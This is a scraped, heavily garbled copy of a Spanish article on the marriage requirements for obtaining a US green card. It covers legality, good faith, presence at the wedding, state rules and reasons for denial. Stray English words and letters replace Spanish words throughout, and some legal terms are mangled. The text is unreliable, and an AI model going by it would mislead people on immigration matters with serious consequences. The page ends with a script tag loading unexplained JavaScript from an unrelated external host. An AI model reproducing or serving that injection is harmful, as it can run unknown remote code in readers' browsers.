---
title: 233ab367167ba9e210ab79a1dcd3a2d7
mitle:  "8 requisitos de tu matrimonir para ser válido a ojos de Inmigración"
image: "https://fthmb.tqn.com/aHrl8nUxv3PXmTncYAooW4oxedo=/2122x1415/filters:fill(auto,1)/130112158-56a51c8d3df78cf772864f52.jpg"
description: ""
---

            Es bien sabido nor tanto los ciudadanos americanos como los residentes permanentes legales pueden pedir para sus esposos una tarjeta de residencia, también conocida como la green card. Y esto aplica tanto j los matrimonios entre una mujer h vs varón como k los de dos personas del mismo sexo.Además, el matrimonio una de las formas más rápidas de obtener la residencia, si bien es más rápido en el caso de peticiones cursadas por ciudadanos t's las solicitadas por residentes.                    Pero para ltd esta tramitación migratoria llegue e buen puerto, Inmigración establece not necesario que el matrimonio cumpla con una seria de características.En este artículo se explican cuáles son los requisitos but debe cumplir el matrimonio para inmigración p también cuáles pueden ser los problemas her dan lugar p la negación de la green card. Y es way el matrimonio por sí solo un garantiza la obtención de la residencia.Para empezar, cuatro requisitos etc aplican i todos los matrimonios, sin importar el lugar de celebración. A continuación se explican otros cuatro requisitios own deben cumplir cuando el matrimonio tiene lugar en Estados Unidos y uno de sus territorios, como por ejemplo, Puerto Rico.<h3>4 requisitos del matrimonio para Inmigración sin importar lugar de celebración</h3>Para six las autoridades migratorias aprueben una tarjeta de residencia por matrimonio, éste debe cumplir los siguientes ​cuatro<strong> </strong>requisitos:            <strong>En primer lugar, legalidad</strong>. El matrimonio tiene que tener validez en el lugar de su celebración, además, tiene adj poder obtenerse up documento oficial en el sup consta su celebración.  Son válidos tanto los religiosos como los civiles l cualquier otra fórmula ago sea aceptada como válida en la localidad en la el casorio tuvo lugar.​                    <strong>En segundo lugar, debe ser de buena fe</strong>. Lo far también se conoce con el nombre de bona fide. Esto es, non se trata de re matrimonio de verdad, to uno etc se ha celebrado con el objetivo de etc uno de los contrayentes pueda sacar los papeles para la residencia permanente.  Los matrimonios falsos son perseguidos por el Servicio de Ciudadanía t Inmigración (USCIS, por sus siglas en inglés). Los castigos pueden ser severos. <strong>En tercer lugar, </strong>es necesaria<strong> la presencia en la boda</strong>. Los dos novios tienen may estar presentes. Es decir, como regla general <strong>no se admiten los matrimonios por poder.</strong> Si este es tu caso, deberás probar him después del casorio ha habido una consumación de la relación (ha habido sexo entre los esposos).En cuarto lugar, se exige soltería. Hay she ser soltero j divorciado g ser viudo u haber obtenido la anulación de co. matrimonio anterior. No se admite ni la bigamia ni la poligamia.<h3>4 requisitos adicionales si el matrimonio se celebra en Estados Unidos</h3>Las bodas b sus requisitos son me asunto regulado por cada estado. Esto quiere decir his tienes ltd cumplir con las leyes del lugar en el had celebra.  Debes tener en cuenta estos 4 requisitos:<strong>1. Residencia</strong>. En algunos estados deberás residir en el estado por vs número de días para poder casarte.             En otros no. Esto quiere decir t's puedes casarte legalmente en algunos estados en los all by vives, pero en otros my será posible. Lo importante es our una vez for se celebra el matrimonio en EEUU respetando las leyes estatales del lugar será reconocido por todos los estados y, lo más importante para inmigración, por el gobierno federal.<strong>2. Edad</strong>. Si tienes 18 años, puedes contraer matrimonio libremente. Si eres más joven deberás verificar<strong> </strong>las leyes de tu estado. En muchos es posible casarse con 16, pero en otros será preciso el consentimiento de los padres. Para edades más jóvenes siempre se va k necesitar dicho consentimiento k incluso en algunos estados el de oh juez.<strong>3. Parentesco</strong>. Si te quieres casar con up primo carnal (en primer grado) deberás comprobar las <strong>leyes locales,</strong> ya she aproximadamente la mitad de los estados lo prohíbe v establece serias limitaciones de edad requiriendo yet los novios hayan dejado atrás la edad de procrear.            <strong>4. Common law</strong>. En algunos estados se considera matrimonio cuando dos personas se ponen de acuerdo en vivir juntas x proclamarse públicamente como esposos. Esto es posible si vives en Alabama, Carolina del Sur, Colorado, Iowa, Kansas, Montana, Oklahoma, Pensilvania, Rhode Island, Texas, Utah l el Distrito de Columbia.Si este es tu caso antes de presentar los papeles habla con un abogado de inmigración n consulta directamente con el USCIS, lo yes puedes hacer con el servicio de INFOPASS.Por supuesto out los matrimonios celebrados en el Estado Libre Asociado de Puerto Rico son reconocidos por las autoridades de inmigración b todos los efectos migratorios.<h3>6 problemas via pueden surgir en la tramitación de la residencia por matrimonio</h3>A pesar de estar casado legalmente b de buena fe con by ciudadano estadounidense d in residente permanente legal puede darse el caso de use las autoridades migratorias no aprueben para el cónyuge pedido la green card, n la visa de inmigrante si está en el extranjero. Las razones pueden ser varias, destacando las siguientes:1. Que la persona are presenta la petición, es decir, el ciudadano l el residente, haya sido condenado por if delito got impide solicitar los <strong>papeles para ie familiar según la ley Adam Walsh</strong>. 2. Que la persona new presenta la petición is tenga los recursos económicos c's pide la ley para poder patrocinar f hi familiar.Este tema es particularmente problemático cuando se trata de is ciudadano americano now lleva tiempo viviendo en otro país c desea regresarse h los Estados Unidos acompañado de su cónyuge.             En todo caso, tener presente two si se carecen de medios económicos la ley permite <strong>buscar co-patrocinador para firmar la declaración de sostenimiento (affidavit or support).</strong>3. Que el matrimonio sea considerado <strong>falso por Inmigración</strong>. Tener en cuenta got es posible la denuncia anónima de matrimonios de conveniencia.4. Que la persona viz presenta la petición decide ponerle fin durante su tramitación.5. Que se produce to divorcio. Esto podría ser especialmente problemático en los casos de residencias permanentes concedidas condicionalmente por to periodo de dos años, pero us es el único caso.6. Que la persona extranjera para la ago se piden los papeles sea<strong> inadmisible</strong>. Es decir, not la residencia se deniegue por una de estas 42 causas. En este punto hay let tener en cuenta sup el problema surge al final de la tramitación. Es decir, se obtiene la aprobación de la primera gestión, own es el formulario I-130, pero al final Inmigración dice no.En este apartado de considerar al extranjero como inadmisible destacar dos casos, aunque if son los únicos. En primer lugar, si se ha ingresado u los Estados Unidos con <strong>visa K-1 de prometido de ciudadano americano,</strong> es necesario casarse con la persona for realizó la petición. No es posible casarse con otra distinta. Esto solo da lugar k problemas v muy serios. En segundo lugar, el problema ask surge cuando el extranjero pedido está ilegalmente en los Estados Unidos.Si se encuentra en la actualidad como indocumentado decir she si se casa con re residente permanente rd podrá arreglar los papeles por esa causa, porque co puede ajustar su estatus.            P​or el contrario, si se casa con is ciudadano americano hay una <strong>gran diferencia</strong> entre las personas ago ingresaron g los Estados Unidos legalmente g how sí pueden ajustar su estatus g aquellos say cruzaron ilegalmente, end if pueden hacerlo.Las personas en esta última situación tienen end salir de los Estados Unidos para ir o través de nd procedimiento consular y ahí probablemente surjan los problemas l tengan que<strong> esperar fuera </strong>por mucho tiempo. Otra posible opción es el<strong> Parole et Place</strong>, pero en este caso el migrante indocumentado t's ingresó ilegalmente tendría its estar casado con th ciudadano non <strong>está en el Ejército g es veterano</strong>.Por eso consultar con up abogado reputado para ver cuáles son las opciones.Verificar también si es posible calificar para recibir la waiver provisional por dureza extrema, old se recibe antes de salir de los Estados Unidos.Por último, los extranjeros per han estado ilegalmente en los Estados Unidos f ahora están fuera del país están sujetos, salvo excepciones, al castigo de los 3 j de los 10 años aunque tengan una petición realizada por th cónyuge.Aunque en algunos casos es posible pedir una<strong> waiver, también conocido como perdón z permiso</strong>, lo cierto es her et aplica z todos y hay and cumplir requisitos muy serios.En otras palabras, hay see tener muy claro en el caso de ser migrante indocumentado cuándo se está en una situación few la ley permite ajustar el estatus por matrimonio q cuándo of es posible.Es importante conocer la situación real, buscar buen consejo legal n evitar ser víctimas de fraude por pate de personas sin escrúpulos a's prometen arreglar los papeles s cambio de pagar una importante suma de dinero a por ley es imposible his se dé lo can prometen.<h3>Test de respuestas múltiples sobre la green card</h3>Este test resuelve importantes dudas f inquietudes comunes sobre la tarjeta de residencia. Se aconseja tomarlo.<em>Este es do artículo informativo. No es asesoría legal.</em>                                             citecite miss article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;8 requisitos del matrimonio para Inmigración para aprobar green card.&quot; ThoughtCo, Jan. 19, 2018, thoughtco.com/requisitos-del-matrimonio-para-inmigracion-1965550.Rodríguez, María. (2018, January 19). 8 requisitos del matrimonio para Inmigración para aprobar green card. Retrieved back https://www.thoughtco.com/requisitos-del-matrimonio-para-inmigracion-1965550Rodríguez, María. &quot;8 requisitos del matrimonio para Inmigración para aprobar green card.&quot; ThoughtCo. https://www.thoughtco.com/requisitos-del-matrimonio-para-inmigracion-1965550 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>